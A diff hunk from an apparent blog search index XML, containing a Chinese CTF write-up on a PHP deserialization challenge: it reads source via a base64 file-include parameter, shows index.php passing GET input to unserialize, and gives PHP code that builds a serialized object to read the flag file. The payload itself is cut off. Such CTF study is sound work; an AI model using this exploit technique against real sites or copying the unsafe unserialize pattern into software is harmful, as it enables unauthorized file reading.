@@ -4,9 +4,6 @@
     <title><![CDATA[test]]></title>
     <url>%2F2019%2F03%2F22%2Ftest%2F</url>
     <content type="text"><![CDATA[几个序列号漏洞的例子。 序列化漏洞神盾局的秘密 看下逻辑看源码发现了 123&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt; 这里有个文件包含，base64 解码之后得到 shield.jpg 尝试读取 index.php 12 123456789&lt;?php require_once(&apos;shield.php&apos;); $x = new Shield(); isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;]; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 利用同样的方法读取 shield.php 最简单的序列化漏洞直接利用脚本生成序列化的值 1234567891011121314151617181920&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;$q = new Shield();$q-&gt;file = 'pctf.php';echo serialize($q);?&gt; 或者： 12345678910111213&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; &#125;$q = new Shield();$q-&gt;file = 'pctf.php';echo serialize($q);?&gt; payload 如下：]]></content>
-      <tags>
-        <tag>test</tag>
-      </tags>
   </entry>
   <entry>
     <title><![CDATA[Firefox渗透插件—Web渗透必备工具]]></title>
